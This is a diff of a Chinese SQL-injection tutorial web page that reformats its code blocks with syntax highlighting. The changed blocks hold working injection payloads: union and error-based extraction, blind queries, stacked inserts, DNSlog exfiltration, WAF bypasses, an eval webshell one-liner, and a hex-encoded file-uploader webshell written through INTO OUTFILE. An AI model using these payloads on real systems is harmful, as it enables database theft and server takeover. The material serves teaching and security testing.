@@ -508,22 +508,22 @@
 <p>原因：在前后端数据的交互中，前端的数据传到后台处理时，没有做严格的判断，导致其传入的数据拼接到SQL语句中，被当成SQL语句的一部分执行，从而导致数据库受损，信息丢失。</p>
 <p>总结：<strong>后台服务器接收相关参数未经过过滤直接带入数据库查询。</strong></p>
 <p>例子：</p>
-<pre><code>比如这是一条前端URL：
-https://blog.csdn.net/aboutus.php?id=1
+<pre class=" language-sql"><code class="language-sql">比如这是一条前端URL：
+https:<span class="token comment" spellcheck="true">//blog.csdn.net/aboutus.php?id=1</span>
 其后台sql语句：
-$sql=“SELECT 123 FROM abc WHERE id='1 '"
+$sql<span class="token operator">=</span>“<span class="token keyword">SELECT</span> <span class="token number">123</span> <span class="token keyword">FROM</span> <span class="token number">abc</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">'1 '</span>"
 
 例如常见的恶意sql构造：
-' and 1=2 --+
+' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token comment" spellcheck="true">--+</span>
 在后台执行时则会变成这样：
-$sql="SELECT 123 FROM abc WHERE id='1' and 1=1 --+ '"
+$sql<span class="token operator">=</span>"<span class="token keyword">SELECT</span> <span class="token number">123</span> <span class="token keyword">FROM</span> <span class="token number">abc</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment" spellcheck="true">--+ '"</span>
 
 也就是说，实际上执行的代码语句即为：
-SELECT 123 FROM abc WHERE id='1' and 1=2 --+ '
+<span class="token keyword">SELECT</span> <span class="token number">123</span> <span class="token keyword">FROM</span> <span class="token number">abc</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token comment" spellcheck="true">--+ '</span>
 而正常应该是：
-SELECT 123 FROM abc WHERE id='1'
+<span class="token keyword">SELECT</span> <span class="token number">123</span> <span class="token keyword">FROM</span> <span class="token number">abc</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">'1'</span>
 
-由于and 1=2中1=2为永假条件，sql将永远无法返回正确的指令
+由于<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span>中<span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span>为永假条件，sql将永远无法返回正确的指令
 </code></pre>
 <p>其中：url中？代表传值的意思，id代表变量，等号代表变量的值。</p>
 <p>浏览器通常使用 ? 来表示GET方法传递参数，而使用POST传递参数是不会显示到URL中的，因此URL中含有？说明就是使用GET方法传递参数。POST型注入和Cookie注入需要插件和工具才可进行。</p>
@@ -569,45 +569,45 @@ SELECT 123 FROM abc WHERE id='1'
 </ol>
 <p><code>union select null,"hacker",null into outfile "D:/www/1.txt" -- -</code> </p>
 <p>常见的写入文件问题  </p>
-<pre><code>--+//注释掉
+<pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">--+//注释掉</span>
 绝对路径有两种 ：
-    1.D:/www/1.txt
-    2.D:\\www\1.txt 因为\带有转义的作用
+    <span class="token number">1</span><span class="token punctuation">.</span>D:<span class="token operator">/</span>www<span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">.</span>txt
+    <span class="token number">2</span><span class="token punctuation">.</span>D:\\www\<span class="token number">1</span><span class="token punctuation">.</span>txt 因为\带有转义的作用
  
 MySQL文件写入的条件：
-    1.绝对路径
-    2.必须为最高权限 root不一定为最高权限，可能会被降权
+    <span class="token number">1</span><span class="token punctuation">.</span>绝对路径
+    <span class="token number">2</span><span class="token punctuation">.</span>必须为最高权限 root不一定为最高权限，可能会被降权
  
 相关防注入
-1.存在魔术引号（php安全机制）
-magic_quote_gpc (开关在PHP.ini中)
+<span class="token number">1</span><span class="token punctuation">.</span>存在魔术引号（php安全机制）
+magic_quote_gpc <span class="token punctuation">(</span>开关在PHP<span class="token punctuation">.</span>ini中<span class="token punctuation">)</span>
 magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误
-addslashes()同样作用
+addslashes<span class="token punctuation">(</span><span class="token punctuation">)</span>同样作用
 如何解决？进行路径编码（hex）单引号 编码之后可以正常解析
  
-2.内置函数is_int等 （情况不多）判断参数类型是否为整数 运用 点对点（HVV）
+<span class="token number">2</span><span class="token punctuation">.</span>内置函数is_int等 （情况不多）判断参数类型是否为整数 运用 点对点（HVV）
  
-3.自定义关键字（如select）
-$id=str_replace('select','过滤成的关键字',$id)//大小写可绕过 
+<span class="token number">3</span><span class="token punctuation">.</span>自定义关键字（如<span class="token keyword">select</span>）
+$id<span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">'select'</span><span class="token punctuation">,</span><span class="token string">'过滤成的关键字'</span><span class="token punctuation">,</span>$id<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//大小写可绕过 </span>
  
-4.WAF防护软件（大部分机制就是过滤关键字）：安全狗，宝塔等
+<span class="token number">4</span><span class="token punctuation">.</span>WAF防护软件（大部分机制就是过滤关键字）：安全狗，宝塔等
 </code></pre>
 <ol start="3">
 <li><strong>利用SQL注入读文件</strong></li>
 </ol>
-<pre><code>mysql内置的函数
+<pre class=" language-sql"><code class="language-sql">mysql内置的函数
 
-load_file()//读取函数 
+load_file<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//读取函数 </span>
 
-into outfile或into dumpfile//导出函数
+<span class="token keyword">into</span> <span class="token keyword">outfile</span>或<span class="token keyword">into</span> <span class="token keyword">dumpfile</span><span class="token comment" spellcheck="true">//导出函数</span>
 
-load_file("D:/www.txt") 值为十六进制的形式
+load_file<span class="token punctuation">(</span><span class="token string">"D:/www.txt"</span><span class="token punctuation">)</span> 值为十六进制的形式
 
-replace()
+replace<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-hex() 将数据转换为十六进制，读的文件内容（保存编码为UTF-8）为中文时转为十六进制，然后再进行解码
+hex<span class="token punctuation">(</span><span class="token punctuation">)</span> 将数据转换为十六进制，读的文件内容（保存编码为UTF<span class="token number">-8</span>）为中文时转为十六进制，然后再进行解码
 
-union select null,hex(load_file(0x23ac)),null -- -
+<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>load_file<span class="token punctuation">(</span><span class="token number">0x23ac</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token comment" spellcheck="true">-- -</span>
 </code></pre>
 <h3 id="5-具体分析"><a href="#5-具体分析" class="headerlink" title="5.具体分析"></a>5.具体分析</h3><h4 id="1-联合查询注入"><a href="#1-联合查询注入" class="headerlink" title="1.联合查询注入"></a><strong>1.联合查询注入</strong></h4><p><strong>特点：</strong>联合查询适合于<strong>有显示位的注入</strong>，即页面某个位置会根据我们输入的数据的变化而变化，是联合两个表进行注入攻击，使用关键词 union select 对两个表进行联合查询。两个表的字段要数要相同，不然会出现报错。</p>
 <p><strong>流程：</strong></p>
@@ -649,7 +649,7 @@ union select null,hex(load_file(0x23ac)),null -- -
 <ul>
 <li><strong>group by 重复键冲</strong></li>
 </ul>
-<pre><code>and (select 1 from (select count(*),concat((select 查询的内容 from  information_schema.tables limit 0,1),floor(rand()*2))x from  information_schema.table group by x)a) --+
+<pre class=" language-sql"><code class="language-sql"><span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> 查询的内容 <span class="token keyword">from</span>  information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span>  information_schema<span class="token punctuation">.</span><span class="token keyword">table</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span>
 </code></pre>
 <p>​	<strong>原理：</strong>主键重复发生报错。</p>
 <p>​	<strong>具体详解：</strong></p>
@@ -669,25 +669,25 @@ union select null,hex(load_file(0x23ac)),null -- -
 <ul>
 <li><strong>updatexml()函数</strong></li>
 </ul>
-<pre><code>?id=1' and updatexml(1,conncat('^',(需要查询的内容),'^')，1) --+
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,conncat('</span><span class="token operator">^</span><span class="token string">',(需要查询的内容),'</span><span class="token operator">^</span>'<span class="token punctuation">)</span>，<span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span>
 
-updatexml(xml_target,xpath_expr,new_xml)；
+updatexml<span class="token punctuation">(</span>xml_target<span class="token punctuation">,</span>xpath_expr<span class="token punctuation">,</span>new_xml<span class="token punctuation">)</span>；
 </code></pre>
 <p>​		<strong>原理：</strong>此函数将XML标记的给定片段的单个部分替换为xml_target新的XML片段new_xml，然后返回更改的XML。</p>
 <p>​		<strong>解析：</strong>xml_target替换的部分与xpath_expr 用户提供的XPath表达式匹配。如果未xpath_expr找到表达式匹配 ，或者找到多个匹配		项，则该函数返回原始 xml_targetXML片段。<strong>所有三个参数都应该是字符串。与extractvalue()类似，如果XPATH写入错误格式，		就会报错，并且返回我们写入的非法内容。</strong></p>
 <ul>
 <li><strong>extractvalue()函数</strong></li>
 </ul>
-<pre><code>?id=1' and extractvalue(1,concat('^',(select database()),'^')) --+//获取数据库名字
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and extractvalue(1,concat('</span><span class="token operator">^</span><span class="token string">',(select database()),'</span><span class="token operator">^</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+//获取数据库名字</span>
 
-extractvalue(xml_frag,xpath_expr)；
+extractvalue<span class="token punctuation">(</span>xml_frag<span class="token punctuation">,</span>xpath_expr<span class="token punctuation">)</span>；
 </code></pre>
 <p>​		<strong>原理：</strong>函数接受两个参数，第一个为XML标记内容，也就是查询的内容，第二个为XPATH路径，也就是查询的路径。</p>
 <p>​		<strong>解析：</strong>如果没有匹配的内容，不管出于何种原因，只要路径有效并且查询的内容由正确嵌套和关闭的元素组成，返回空字符串。</p>
 <p>​		<strong>但如果路径写入错误格式，就会报错并且返回我们写入的非法内容。</strong></p>
 <h4 id="3-回显注入"><a href="#3-回显注入" class="headerlink" title="3.回显注入"></a><strong>3.回显注入</strong></h4><p>特点：利用注入漏洞可以改变页面返回数据。</p>
 <h4 id="4-堆叠注入"><a href="#4-堆叠注入" class="headerlink" title="4.堆叠注入"></a><strong>4.堆叠注入</strong></h4><p>原理：在SQL语句中，语句的结束都是以;结尾，但是如果我们在;后面再加上一条SQL语句，两条语句会一起执行。（只有某些特定的版本才能执行）</p>
-<pre><code>    ?id=-1'; insert into users(id,username,password) values(88,'aaa','bbb')%23
+<pre class=" language-sql"><code class="language-sql">    ?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'; insert into users(id,username,password) values(88,'</span><span class="token number">aaa</span><span class="token string">','</span><span class="token number">bbb</span>'<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
 </code></pre>
 <h4 id="5-基于布尔的盲注"><a href="#5-基于布尔的盲注" class="headerlink" title="5.基于布尔的盲注"></a><strong>5.基于布尔的盲注</strong></h4><p><strong>特点：</strong>即在<strong>页面不显示数据，只显示对错</strong>，此时我们输入的语句让页面呈现两种状态，相当于true和false，根据这两种状态判断我们输入的语句是否查询成功。因此<strong>需要构造判断语句，根据页面是否回显证实猜想。</strong></p>
 <p>一般用到的函数：</p>
@@ -716,37 +716,37 @@ extractvalue(xml_frag,xpath_expr)；
 <li><p>判断库中的表名（表的个数、每个表名的长度和表名的ASCII）</p>
 </li>
 </ul>
-<pre><code>//猜测当前数据库中是否存在admin表
-http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from admin) --+
-1：判断当前数据库中表的个数
-// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4
-http://127.0.0.1/sqli/Less-5/?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())&gt;3 --+
-2：判断每个表的长度
-//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6
-http://127.0.0.1/sqli/Less-5/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6 --+
-//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6
-http://127.0.0.1/sqli/Less-5/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6 --+
-3：判断每个表的每个字符的ascii值
-//判断第一个表的第一个字符的ascii值
-http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+
-//判断第一个表的第二个字符的ascii值               
-http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;100 --+
-----由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在users 表中判断
+<pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">//猜测当前数据库中是否存在admin表</span>
+http:<span class="token comment" spellcheck="true">//127.0.0.1/sqli/Less-5/?id=1' and exists(select*from admin) --+</span>
+<span class="token number">1</span>：判断当前数据库中表的个数
+<span class="token comment" spellcheck="true">// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4</span>
+http:<span class="token comment" spellcheck="true">//127.0.0.1/sqli/Less-5/?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())>3 --+</span>
+<span class="token number">2</span>：判断每个表的长度
+<span class="token comment" spellcheck="true">//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6</span>
+http:<span class="token comment" spellcheck="true">//127.0.0.1/sqli/Less-5/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>6 --+</span>
+<span class="token comment" spellcheck="true">//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6</span>
+http:<span class="token comment" spellcheck="true">//127.0.0.1/sqli/Less-5/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6 --+</span>
+<span class="token number">3</span>：判断每个表的每个字符的ascii值
+<span class="token comment" spellcheck="true">//判断第一个表的第一个字符的ascii值</span>
+http:<span class="token comment" spellcheck="true">//127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 --+</span>
+<span class="token comment" spellcheck="true">//判断第一个表的第二个字符的ascii值               </span>
+http:<span class="token comment" spellcheck="true">//127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))>100 --+</span>
+<span class="token comment" spellcheck="true">----由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在users 表中判断</span>
 </code></pre>
 <ul>
 <li>判断表中的字段名（字段个数、每个字段名长度、字段名的ASCII值）</li>
 </ul>
 <p>​		爆字段中的数据（字段中的数据长度、数据的ASCII）</p>
-<pre><code>1: 判断数据的长度
-// 判断id字段的第一个数据的长度
-http://127.0.0.1/sqli/Less-5/?id=1' and length((select id from users limit 0,1))&gt;5 --+
-// 判断id字段的第二个数据的长度
-http://127.0.0.1/sqli/Less-5/?id=1' and length((select id from users limit 1,1))&gt;5 --+ 
-2：判断数据的ascii值
-// 判断id字段的第一行数据的第一个字符的ascii值
-http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select id from users limit  0,1),1,1))&gt;100 --+
-// 判断id字段的第二行数据的第二个字符的ascii值
-http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select id from users limit 0,1),2,1))&gt;100 --+...........
+<pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>: 判断数据的长度
+<span class="token comment" spellcheck="true">// 判断id字段的第一个数据的长度</span>
+http:<span class="token comment" spellcheck="true">//127.0.0.1/sqli/Less-5/?id=1' and length((select id from users limit 0,1))>5 --+</span>
+<span class="token comment" spellcheck="true">// 判断id字段的第二个数据的长度</span>
+http:<span class="token comment" spellcheck="true">//127.0.0.1/sqli/Less-5/?id=1' and length((select id from users limit 1,1))>5 --+ </span>
+<span class="token number">2</span>：判断数据的ascii值
+<span class="token comment" spellcheck="true">// 判断id字段的第一行数据的第一个字符的ascii值</span>
+http:<span class="token comment" spellcheck="true">//127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select id from users limit  0,1),1,1))>100 --+</span>
+<span class="token comment" spellcheck="true">// 判断id字段的第二行数据的第二个字符的ascii值</span>
+http:<span class="token comment" spellcheck="true">//127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select id from users limit 0,1),2,1))>100 --+...........</span>
 </code></pre>
 <h4 id="6-基于时间的盲注"><a href="#6-基于时间的盲注" class="headerlink" title="6.基于时间的盲注"></a><strong>6.基于时间的盲注</strong></h4><p><strong>特点：</strong>通过返回时间的长短判断。</p>
 <p><strong>知识点：</strong></p>
@@ -854,7 +854,7 @@ http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select id from users limit
 <p>​	读文件：LOAD_FILE()</p>
 <p>​	限制：只能本机的文件且文件有读取权限，且字节数小于max_allowed_packet</p>
 <p>​	判断文件有无读取权限：</p>
-<pre><code>and (select count(*) from mysql.user)&gt;0 /*如果结果返回正常，说明具有读写权限如果返回错误，应该是管理员给数据库账户降权。如果文件不存在或者不能被读出，函数返回空。在 windows 下，如果 NTFS 设置得当，是不能读取相关的文件的，当遇到只有administrators 才能访问的文件，users 就别想 load_file 出来。
+<pre class=" language-sql"><code class="language-sql"><span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span> <span class="token operator">/</span><span class="token operator">*</span>如果结果返回正常，说明具有读写权限如果返回错误，应该是管理员给数据库账户降权。如果文件不存在或者不能被读出，函数返回空。在 windows 下，如果 NTFS 设置得当，是不能读取相关的文件的，当遇到只有administrators 才能访问的文件，users 就别想 load_file 出来。
 </code></pre>
 <p>​	用法：select LOAD_FILE(‘E:\in.txt’);</p>
 <p>​	两个难点：</p>
@@ -880,17 +880,17 @@ http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select id from users limit
 <ul>
 <li>直接将select内容导入到文件中</li>
 </ul>
-<pre><code>select ... into outfile "c:\\phpnow\\htdocs\\test.php"/*此处的...可以是一个函数如version()也可以是一句话如:&lt;?php @eval($_post["111"]) ?&gt;,或者其他内容
+<pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">"c:\\phpnow\\htdocs\\test.php"</span><span class="token operator">/</span><span class="token operator">*</span>此处的<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>可以是一个函数如version<span class="token punctuation">(</span><span class="token punctuation">)</span>也可以是一句话如:<span class="token operator">&lt;</span>?php <span class="token variable">@eval</span><span class="token punctuation">(</span>$_post<span class="token punctuation">[</span><span class="token string">"111"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> ?<span class="token operator">></span><span class="token punctuation">,</span>或者其他内容
 </code></pre>
 <ul>
 <li>修改文件结尾</li>
 </ul>
-<pre><code>select version() into outfile "c:\\phpnow\\htdocs\\test.php" LINES TERMINATED BY 0x16
+<pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">"c:\\phpnow\\htdocs\\test.php"</span> <span class="token keyword">LINES</span> <span class="token keyword">TERMINATED BY</span> <span class="token number">0x16</span>
 </code></pre>
 <p>​	解释：select * from * limit 0,1 into outfile ‘/wamp/www/tmpulujm.php’的意思是将内容输入到outfile中。</p>
 <p>​	LINES TERMINATED BY则是into outfile的参数，意思是行结尾的时候用by后面的内容，通常的一般为‘/r/n’，此处我们将by后的内容修改为后面的16进制的文件。16 进制可以为一句话或者其他任何的代码，可自行构造。</p>
 <p>例如：</p>
-<pre><code>http://192.168.0.166/php/newsshow.php?cid=-6901 OR 3616%3D3616 LIMIT 0%2C1 INTO OUTFILE '%2Fwamp%2Fwww%2Ftmpulujm.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c77616d705c5c7777775c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- -- -
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//192.168.0.166/php/newsshow.php?cid=-6901 OR 3616%3D3616 LIMIT 0%2C1 INTO OUTFILE '%2Fwamp%2Fwww%2Ftmpulujm.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c77616d705c5c7777775c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- -- -</span>
 </code></pre>
 <p>​	在 sqlmap 中 os-shell 采取的就是这样的方式，具体可参考 os-shell 分析文章：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/p/5505110.html">http://www.cnblogs.com/lcamry/p/5505110.html</a></p>
 <p><strong>DNSlog注入流程：</strong></p>
@@ -900,10 +900,10 @@ http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select id from users limit
 <li><p>UNC构建DNS服务器地址（其实就是服务器子域名），假装访问文件，产生DNSLog</p>
 </li>
 </ol>
-<pre><code>select load_file('aaa.yourid.dnslog.cn/byh');四个斜杠其实本来只有两个，还有两个是防止转义，/byh不能缺少，不然不是一个标准的路径
+<pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'aaa.yourid.dnslog.cn/byh'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>四个斜杠其实本来只有两个，还有两个是防止转义，<span class="token operator">/</span>byh不能缺少，不然不是一个标准的路径
 </code></pre>
 <p>把子域名替换成函数或者查询SQL</p>
-<pre><code>select if((select load_file(concat('',database(),'yourid.dnslog.cn/byh'))),1,0);#其实就是把aaa换成了database()
+<pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> load_file<span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'yourid.dnslog.cn/byh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#其实就是把aaa换成了database()</span>
 </code></pre>
 <p>最后我们使用的平台就会显示解析日志，在日志里就能看到查询的内容。</p>
 <h4 id="9-二次注入攻击"><a href="#9-二次注入攻击" class="headerlink" title="9.二次注入攻击"></a><strong>9.二次注入攻击</strong></h4><p><strong>定义：</strong>二次注入漏洞是一种在 Web 应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与一次注入攻击漏洞相同的攻击威力。</p>
@@ -1039,15 +1039,15 @@ http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select id from users limit
 </ol>
 <p>19.信任白名单绕过</p>
 <p>有些 WAF 会自带一些文件白名单，对于白名单 waf 不会拦截任何操作，所以可以利用这个特点，可以试试白名单绕过。<br>白名单通常有目录</p>
-<pre><code>/admin
-/phpmyadmin/admin.php
-http://192.168.0.115/06/vul/sqli/sqli_str.php?a=/admin.php&amp;name=vince+&amp;submit=1 http://192.168.0.165/06/vul/sqli/sqli_str.php/phpmyadmin?name=%27%20union%20s elect%201,user()--+&amp;submit=1
+<pre class=" language-sql"><code class="language-sql"><span class="token operator">/</span>admin
+<span class="token operator">/</span>phpmyadmin<span class="token operator">/</span>admin<span class="token punctuation">.</span>php
+http:<span class="token comment" spellcheck="true">//192.168.0.115/06/vul/sqli/sqli_str.php?a=/admin.php&amp;name=vince+&amp;submit=1 http://192.168.0.165/06/vul/sqli/sqli_str.php/phpmyadmin?name=%27%20union%20s elect%201,user()--+&amp;submit=1</span>
 </code></pre>
 <p>20.静态文件绕过</p>
 <p>除了白名单信任文件和目录外，还有一部分 waf 并不会对静态文件进行拦截。例如图片文件 jpg 、png 、gif 或者 css 、js 会对这些静态文件的操作不会进行检测从而绕过 waf 拦截。</p>
-<pre><code>/1.jpg&amp;name=vince+&amp;submit=1
-/1.jpg=/1.jpg&amp;name=vince+&amp;submit=1
-/1.css=/1.css&amp;name=vince+&amp;submit=1
+<pre class=" language-sql"><code class="language-sql"><span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">.</span>jpg<span class="token operator">&amp;</span>name<span class="token operator">=</span>vince<span class="token operator">+</span><span class="token operator">&amp;</span>submit<span class="token operator">=</span><span class="token number">1</span>
+<span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">.</span>jpg<span class="token operator">=</span><span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">.</span>jpg<span class="token operator">&amp;</span>name<span class="token operator">=</span>vince<span class="token operator">+</span><span class="token operator">&amp;</span>submit<span class="token operator">=</span><span class="token number">1</span>
+<span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">.</span>css<span class="token operator">=</span><span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">.</span>css<span class="token operator">&amp;</span>name<span class="token operator">=</span>vince<span class="token operator">+</span><span class="token operator">&amp;</span>submit<span class="token operator">=</span><span class="token number">1</span>
 </code></pre>
 
                 
